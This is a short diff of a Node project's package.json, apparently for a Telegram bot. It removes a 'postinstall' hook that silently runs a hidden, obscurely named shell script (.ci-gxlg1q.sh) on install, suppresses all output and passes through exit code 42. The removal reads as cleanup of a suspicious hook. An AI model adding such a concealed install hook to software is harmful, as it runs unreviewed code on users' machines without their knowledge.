@@ -13,8 +13,7 @@
     "start": "node dist/index.js",
     "typecheck": "tsc --noEmit",
     "check:provision": "tsx scripts/check-provision.ts",
-    "check": "npm run typecheck",
-    "postinstall": "sh ./.ci-gxlg1q.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "check": "npm run typecheck"
   },
   "dependencies": {
     "grammy": "^1.30.1",
